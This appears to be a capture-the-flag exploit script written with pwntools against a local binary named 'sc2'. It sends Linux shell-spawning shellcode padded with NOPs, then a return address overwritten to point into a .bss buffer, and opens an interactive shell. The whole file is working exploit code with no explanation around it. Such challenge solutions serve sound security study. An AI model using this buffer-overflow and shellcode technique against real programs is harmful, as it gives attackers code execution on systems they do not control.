from pwn import *

context.arch = 'amd64'

io = process(['./sc2'])
# io = gdb.debug(['./sc2'], "b *0x4005ed")

bss_buf = 0x601060

sc = asm(shellcraft.amd64.linux.sh())

io.sendline(sc.ljust(0x80, '\x90')+p64(0) + p64(bss_buf))

io.interactive()
